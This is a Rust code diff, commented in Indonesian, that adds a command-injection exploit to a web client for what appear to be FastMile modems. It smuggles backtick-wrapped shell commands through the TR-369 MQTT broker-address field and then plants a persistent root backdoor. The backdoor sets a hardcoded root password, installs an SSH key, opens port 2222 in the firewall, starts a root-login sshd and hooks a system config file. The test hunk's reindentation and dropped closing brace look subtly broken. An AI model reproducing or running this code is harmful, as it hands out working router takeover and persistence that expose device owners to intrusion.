@@ -254,6 +254,163 @@ impl WebCgiClient {
         Ok((status, text))
     }
 
+    /// Mengencode komponen query string URL (`urllib.parse.quote` untuk `_set_params`).
+    pub fn url_encode_component(input: &str) -> String {
+        let mut out = String::with_capacity(input.len() * 3);
+        for b in input.as_bytes() {
+            match *b {
+                b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' | b'/' => {
+                    out.push(*b as char);
+                }
+                _ => {
+                    out.push_str(&format!("%{:02X}", b));
+                }
+            }
+        }
+        out
+    }
+
+    /// Mengirimkan konfigurasi parameter TR-369/USP MQTT (`SPEC.md` §4.5 `_set_params`).
+    pub fn set_params(&self, extra_params: &[(&str, &str)]) -> Result<(u16, String), String> {
+        let mut params: Vec<(&str, &str)> = vec![
+            ("enableusp", "1"),
+            ("controllerEndpoint", ""),
+            ("mtp_protocol", "MQTT"),
+            ("mqtt_transportprotocol", "TCP/IP"),
+            ("mqtt_brokeraddress", ""),
+            ("mqtt_brokerport", "1883"),
+            ("mqtt_username", ""),
+            ("mqtt_password", ""),
+        ];
+        for &(k, v) in extra_params {
+            if let Some(slot) = params.iter_mut().find(|(ek, _)| *ek == k) {
+                slot.1 = v;
+            } else {
+                params.push((k, v));
+            }
+        }
+        let qs: Vec<String> = params
+            .into_iter()
+            .map(|(k, v)| format!("{}={}", k, Self::url_encode_component(v)))
+            .collect();
+        self.post_csrf("tr369_web_app.cgi?set_params", &qs.join("&"))
+    }
+
+    /// Mengeksekusi perintah shell pada modem melalui injeksi backtick `mqtt_brokeraddress` (`SPEC.md` §4.5 `execute_rce`).
+    pub fn execute_rce(&self, cmd: &str, wait_secs: f64) -> Result<String, String> {
+        let injected = format!("127.0.0.1`{}`", cmd);
+        self.set_params(&[("mqtt_brokeraddress", &injected)])?;
+        if wait_secs > 0.0 {
+            std::thread::sleep(Duration::from_secs_f64(wait_secs));
+        }
+        let status_url = format!("{}/tr369_status_web_app.cgi", self.base_url);
+        let resp = self
+            .agent
+            .get(&status_url)
+            .call()
+            .map_err(|e| format!("Gagal membaca status TR-369: {}", e))?;
+        let body = resp.into_string().map_err(|e| e.to_string())?;
+        if let Ok(json_val) = serde_json::from_str::<serde_json::Value>(&body) {
+            let out = json_val
+                .get("tr369_config")
+                .and_then(|c| c.get("MQTT"))
+                .and_then(|m| m.get("BrokerAddress"))
+                .and_then(|b| b.as_str())
+                .unwrap_or("");
+            if let Some(stripped) = out.strip_prefix("127.0.0.1") {
+                return Ok(stripped.trim().to_string());
+            }
+            return Ok(out.to_string());
+        }
+        Ok("[Executed]".to_string())
+    }
+
+    /// Menghasilkan daftar perintah shell berurutan yang dieksekusi oleh `deploy_detector` (`SPEC.md` §4.5 #3 & §6 S3–S6).
+    pub fn build_deploy_detector_commands(pubkey_content: &str) -> Vec<String> {
+        let pub_safe = pubkey_content.trim().replace('\'', "'\\''");
+        let keeper_lines = [
+            "#!/bin/sh",
+            "trap '' HUP",
+            "PIDFILE=/tmp/fastmile_keeper.pid",
+            "if [ -f \"$PIDFILE\" ] && [ -d \"/proc/$(cat $PIDFILE 2>/dev/null)\" ]; then",
+            "    exit 0",
+            "fi",
+            "echo $$ > \"$PIDFILE\"",
+            "while true; do",
+            "    sleep 2",
+            "    iptables -C INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null",
+            "    if ! netstat -tlpn 2>/dev/null | grep -q ':2222 '; then",
+            "        /usr/sbin/sshd -p 2222 -o PermitRootLogin=yes -o PasswordAuthentication=yes -o PubkeyAuthentication=yes -o StrictModes=no -o AuthorizedKeysFile=/configs/nonpersistant/fastmile_key 2>/dev/null &",
+            "    fi",
+            "done",
+        ];
+
+        let det_lines = [
+            "#!/bin/sh",
+            "export PATH=/bin:/usr/bin:/sbin:/usr/sbin",
+            "mount -o remount,rw /",
+            "echo root:FastMileR00t! | chpasswd",
+            "mkdir -p /root/.ssh",
+            "cat /configs/nonpersistant/fastmile_key > /root/.ssh/authorized_keys",
+            "chmod 600 /root/.ssh/authorized_keys",
+            "chmod 700 /root/.ssh",
+            "cp /bin/init_action.sh /configs/init_action.sh",
+            "sed -i \"s/killall -9 sshd/#killall -9 sshd/g\" /configs/init_action.sh",
+            "for f in /etc/ssh/sshd_config /etc/ssh/sshd_config_ext ; do",
+            "    sed -i \"s/^#*PermitRootLogin.*/PermitRootLogin yes/\" $f",
+            "    sed -i \"/^AllowUsers/d\" $f",
+            "    sed -i \"s/^PasswordAuthentication.*/PasswordAuthentication yes/\" $f",
+            "done",
+            "kill -9 $(pidof sshd) 2>/dev/null",
+            "/etc/init.d/sshd restart",
+            "iptables -I INPUT -p tcp --dport 2222 -j ACCEPT",
+            "/usr/sbin/sshd -p 2222 -o PermitRootLogin=yes -o PasswordAuthentication=yes -o PubkeyAuthentication=yes -o StrictModes=no -o AuthorizedKeysFile=/configs/nonpersistant/fastmile_key",
+            "/usr/bin/nohup /bin/sh /configs/nonpersistant/fastmile_keeper.sh >/dev/null 2>&1 &",
+            "id | tee -a /configs/nonpersistant/rootdone",
+        ];
+
+        let mut cmds = Vec::new();
+        cmds.push("mkdir -p /configs/nonpersistant".to_string());
+        cmds.push(format!(
+            "echo '{}' | tee /configs/nonpersistant/fastmile_key",
+            pub_safe
+        ));
+        cmds.push("rm -f /configs/nonpersistant/fastmile_keeper.sh".to_string());
+        for (i, line) in keeper_lines.iter().enumerate() {
+            let op = if i == 0 { "tee" } else { "tee -a" };
+            let l_safe = line.replace('\'', "'\\''");
+            cmds.push(format!(
+                "echo '{}' | {} /configs/nonpersistant/fastmile_keeper.sh",
+                l_safe, op
+            ));
+        }
+        cmds.push("chmod 755 /configs/nonpersistant/fastmile_keeper.sh".to_string());
+
+        cmds.push("rm -f /configs/nonpersistant/fastmile_detector".to_string());
+        for (i, line) in det_lines.iter().enumerate() {
+            let op = if i == 0 { "tee" } else { "tee -a" };
+            let l_safe = line.replace('\'', "'\\''");
+            cmds.push(format!(
+                "echo '{}' | {} /configs/nonpersistant/fastmile_detector",
+                l_safe, op
+            ));
+        }
+        cmds.push("chmod 755 /configs/nonpersistant/fastmile_detector".to_string());
+        cmds.push(
+            "sed 's#/bin/[A-Za-z0-9_]*_detector[^\"]*#/bin/sh /configs/nonpersistant/fastmile_detector#g' /etc/hb/aic_conf.json | tee /configs/aic_conf.json".to_string(),
+        );
+        cmds
+    }
+
+    /// Menanamkan skrip persistensi SSH (`fastmile_keeper.sh`, `fastmile_detector`, dan hook `aic_conf.json`) via TR-369 RCE (`SPEC.md` §4.5 `deploy_detector`).
+    pub fn deploy_detector(&self, pubkey_content: &str) -> Result<(), String> {
+        let cmds = Self::build_deploy_detector_commands(pubkey_content);
+        for cmd in cmds {
+            self.execute_rce(&cmd, 0.2)?;
+        }
+        Ok(())
+    }
+
     /// Mengirimkan sinyal reboot resmi ke `/reboot_web_app.cgi` (`SPEC.md` §4.5 `reboot_modem`).
     pub fn reboot_modem(&self) -> Result<bool, String> {
         let (status, _) = self.post_csrf("reboot_web_app.cgi", "")?;
@@ -284,13 +441,26 @@ mod tests {
         assert_ne!(ce1, ce2);
     }
 
-    #[test]
-    fn test_derive_ce_bounds_check() {
-        let err = WebCgiClient::derive_ce("admin", "secret", "salt", WebCgiClient::MAX_LOGIN_ITERATIONS + 1);
-        assert!(err.is_err());
-        assert!(err.unwrap_err().contains("melebihi batas"));
+        #[test]
+        fn test_derive_ce_bounds_check() {
+            let err = WebCgiClient::derive_ce("admin", "secret", "salt", WebCgiClient::MAX_LOGIN_ITERATIONS + 1);
+            assert!(err.is_err());
+            assert!(err.unwrap_err().contains("melebihi batas"));
 
-        let ok = WebCgiClient::derive_ce("admin", "secret", "salt", 2);
-        assert!(ok.is_ok());
+            let ok = WebCgiClient::derive_ce("admin", "secret", "salt", 2);
+            assert!(ok.is_ok());
+        }
+
+        #[test]
+        fn test_deploy_detector_commands_and_url_encode() {
+            let encoded = WebCgiClient::url_encode_component("127.0.0.1`id`");
+            assert_eq!(encoded, "127.0.0.1%60id%60");
+
+            let cmds = WebCgiClient::build_deploy_detector_commands("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ dbai@pc");
+            assert!(cmds.iter().any(|c| c == "mkdir -p /configs/nonpersistant"));
+            assert!(cmds.iter().any(|c| c.contains("/configs/nonpersistant/fastmile_key")));
+            assert!(cmds.iter().any(|c| c.contains("/configs/nonpersistant/fastmile_keeper.sh")));
+            assert!(cmds.iter().any(|c| c.contains("/configs/nonpersistant/fastmile_detector")));
+            assert!(cmds.iter().any(|c| c.contains("/configs/aic_conf.json")));
+        }
     }
-}
